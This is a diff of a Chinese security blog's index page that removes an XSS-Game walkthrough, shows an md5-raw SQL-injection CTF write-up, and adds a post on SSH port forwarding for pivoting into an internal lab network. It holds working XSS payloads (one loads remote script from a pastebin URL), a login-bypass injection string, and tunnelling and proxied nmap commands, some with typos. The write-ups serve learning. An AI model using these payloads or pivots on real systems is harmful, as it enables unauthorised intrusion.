@@ -229,155 +229,6 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/04/21/XSS-Game-解题记录/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="boogle">
-      <meta itemprop="description" content>
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Boogle's Blogs">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2018/04/21/XSS-Game-解题记录/" itemprop="url">XSS-Game 解题记录</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-04-21T15:41:13+08:00">
-                2018-04-21
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category">
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">In</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/web安全/" itemprop="url" rel="index">
-                    <span itemprop="name">web安全</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <p>题目链接：<a href="https://xss-game.appspot.com" target="_blank" rel="noopener">https://xss-game.appspot.com</a></p>
-<h3 id="Level-1"><a href="#Level-1" class="headerlink" title="Level 1"></a>Level 1</h3><p>level 1 比较简单，get方法传入的query参数会直接在b标签中输出。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload</span><br><span class="line">https://xss-game.appspot.com/level1/frame?query=&lt;script&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure></p>
-<h3 id="Level-2"><a href="#Level-2" class="headerlink" title="Level 2"></a>Level 2</h3><p>level 2 是一个留言板，输入的内容会发布在一个<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">```</span><br><span class="line">payload</span><br><span class="line">&lt;img src=&apos;&apos; onerror=&apos;alert(1)&apos;&gt;</span><br></pre></td></tr></table></figure></p>
-<h3 id="Level-3"><a href="#Level-3" class="headerlink" title="Level 3"></a>Level 3</h3><p>Level 3 中传入的参数带入到了img标签中的src里，那么这里可以闭合src再引入新的事件触发xss。<br>这里需要注意的是src是由双引号闭合的，但是传入双引号却无法闭合，传入单引号会闭合。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">payload </span><br><span class="line">https://xss-game.appspot.com/level3/frame#3&apos; onerror=&apos;alert(1)&apos;</span><br></pre></td></tr></table></figure>
-<h3 id="Level-4"><a href="#Level-4" class="headerlink" title="Level 4"></a>Level 4</h3><p>这个题目中，传入的内容会被作为一个时间函数的参数，而这个函数是由img标签中onload事件触发的，那么思路便是将调用的函数闭合，再引入我们需要执行的代码。<br>onload中可以执行多条语句，中间以;分隔，注意这里我们传入的分号要进行url编码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload</span><br><span class="line">https://xss-game.appspot.com/level4/frame?timer=&apos;);alert(&apos;1</span><br></pre></td></tr></table></figure></p>
-<h3 id="Level-5"><a href="#Level-5" class="headerlink" title="Level 5"></a>Level 5</h3><p>这个题目中a标签中的href是用户可控的，href默认是解析url，但是我们可以指定为javascript执行。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload </span><br><span class="line">https://xss-game.appspot.com/level5/frame/signup?next=javascript:alert(1)</span><br></pre></td></tr></table></figure></p>
-<h3 id="Level-6"><a href="#Level-6" class="headerlink" title="Level 6"></a>Level 6</h3><p>这个题目可以使应用程序请求成为外部文件，调用远程js代码，虽然其过滤了https,但是没有考虑大写情况。<br>这里使用一个在线远程文件服务器。<a href="https://pastebin.com/0qkuhWbx" target="_blank" rel="noopener">https://pastebin.com/</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload</span><br><span class="line"></span><br><span class="line">https://xss-game.appspot.com/level6/frame#htTps://pastebin.com/raw/EuYL4VC8</span><br></pre></td></tr></table></figure></p>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/01/25/md5-true-引发的sql注入/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -474,6 +325,157 @@
             <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">class RealSecureLoginManager &#123;</span><br><span class="line">    private $em;</span><br><span class="line">    private $user;</span><br><span class="line">    private $password;</span><br><span class="line"></span><br><span class="line">    public function __construct($user, $password) &#123;</span><br><span class="line">        $this-&gt;em = DoctrineManager::getEntityManager();</span><br><span class="line">        $this-&gt;user = $user;</span><br><span class="line">        $this-&gt;password = $password;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function isValid() &#123;</span><br><span class="line">        $pass = md5($this-&gt;password, true);</span><br><span class="line">        $user = $this-&gt;sanitizeInput($this-&gt;user);</span><br><span class="line"></span><br><span class="line">        $queryBuilder = $this-&gt;em-&gt;createQueryBuilder()</span><br><span class="line">            -&gt;select(&quot;COUNT(p)&quot;)</span><br><span class="line">            -&gt;from(&quot;User&quot;, &quot;u&quot;)</span><br><span class="line">            -&gt;where(&quot;password = &apos;$pass&apos; AND user = &apos;$user&apos;&quot;);</span><br><span class="line">        $query = $queryBuilder-&gt;getQuery();</span><br><span class="line">        return boolval($query-&gt;getSingleScalarResult());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function sanitizeInput($input) &#123;</span><br><span class="line">        return addslashes($input);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$auth = new RealSecureLoginManager(</span><br><span class="line">    $_POST[&apos;user&apos;],</span><br><span class="line">    $_POST[&apos;passwd&apos;]</span><br><span class="line">);</span><br><span class="line">if (!$auth-&gt;isValid()) &#123;</span><br><span class="line">    exit;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <p>在上面的代码中，$queryBuilder拼接了一条sql查询语句，但是对传入的user进行了addslashes函数过滤，也就是说没有办法通过user进行注入，而且pass变量是经过md5计算的散列值，理论上也没有办法进行注入，但是这里这里md5()函数的$raw_output值设置为true，那么这个md5报文摘要将以16字节长度的原始二进制格式返回。<br>什么意思呢？看一下下面的执行结果<br><img src="https://i.loli.net/2018/11/25/5bfab091240d7.png" alt><br>也就是说这个二进制格式的返回值会引入其他非预期的字符，比如说<strong>\</strong><br>这里经过fazz,发现 md5(128, true) 最后的结果带有反斜杠。因此这题最后的payload如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user= OR 1=1#&amp;passwd=128</span><br></pre></td></tr></table></figure></p>
 <p>另外实验吧的一道题目类似<br><a href="http://ctf5.shiyanbar.com/web/houtai/ffifdyop.php" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/web/houtai/ffifdyop.php</a></p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/01/04/linux端口转发/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="boogle">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Boogle's Blogs">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2018/01/04/linux端口转发/" itemprop="url">linux端口转发</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-01-04T15:34:08+08:00">
+                2018-01-04
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/后渗透/" itemprop="url" rel="index">
+                    <span itemprop="name">后渗透</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h3 id="0x01-ssh正向代理动态端口转发"><a href="#0x01-ssh正向代理动态端口转发" class="headerlink" title="0x01 ssh正向代理动态端口转发"></a>0x01 ssh正向代理动态端口转发</h3><p>环境：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">A:192.168.111.130     //kali攻击机</span><br><span class="line">B:192.168.111.128     //能够进行ssh连接（知道其ssh口令）的ubuntu跳板</span><br><span class="line">C:172.17.0.2          //跟转发机处于同一内网的目标靶机（docker启动的容器）</span><br></pre></td></tr></table></figure></p>
+<p>在kali上执行命令<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh 2 -D 2333 ghost@192.168.111.128  //这条命令是将A本地的2333端口，与B的22端口建立socks连接,输入B的ssh口令即可进行连接</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://i.loli.net/2018/12/04/5c062171a531d.png" alt></p>
+<p>可以使用火狐添加本地127.0.0.1 2333端口的socks代理查看内网的web服务<br><img src="https://i.loli.net/2018/12/04/5c0622242f8b9.png" alt></p>
+<p>夜可以使用proxychains代理本地应用<br>配置proxychains代理<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gedit /etc/proxychains.conf</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">添加  socks 127.0.0.1 2333</span><br></pre></td></tr></table></figure></p>
+<p>例如使用nmap扫描开放端口<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains nma[ -Pn -sT 172.17.0.2</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://i.loli.net/2018/12/04/5c062304d5ddc.png" alt></p>
+<h3 id="0X02-ssh正向代理单一端口转发"><a href="#0X02-ssh正向代理单一端口转发" class="headerlink" title="0X02 ssh正向代理单一端口转发"></a>0X02 ssh正向代理单一端口转发</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -L 8888:172.17.0.2:80 ghost@192.168.111.128//访问127.0.0.1:8888相当于访问172.17.0.2:80</span><br></pre></td></tr></table></figure>
+<h3 id="0x03-ssh反向代理单一端口转发"><a href="#0x03-ssh反向代理单一端口转发" class="headerlink" title="0x03 ssh反向代理单一端口转发"></a>0x03 ssh反向代理单一端口转发</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">//先在A(kali)上生成ssh需要的host key</span><br><span class="line"></span><br><span class="line">ssh-keygen -t rsa -f /etc/ssh/ssh_host_rsa_key</span><br><span class="line">ssh-keygen -t dsa -f /etc/ssh/ssh_host_dsa_key</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//然后在B运行</span><br><span class="line">ssh -R 8888:172.17.0.20:80 root@192.168.111.130 //A访问127.0.0.1:2222相当于访问C:22</span><br></pre></td></tr></table></figure>
+<h3 id="0x04-ssh多级代理"><a href="#0x04-ssh多级代理" class="headerlink" title="0x04 ssh多级代理"></a>0x04 ssh多级代理</h3><p>增加一级 D:192.168.168.4<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ssh -R 8888:127.0.0.1:4444 root@192.168.111.130</span><br><span class="line">B作反向代理，将A:8888与B:4444打通ssh隧道</span><br><span class="line"></span><br><span class="line">ssh -2 -D 4444 msfadmin@172.17.0.2 //需要知道C的ssh口令</span><br><span class="line">B将本地4444端口与C打通ssh隧道，C作正向代理</span><br></pre></td></tr></table></figure></p>
 
           
         
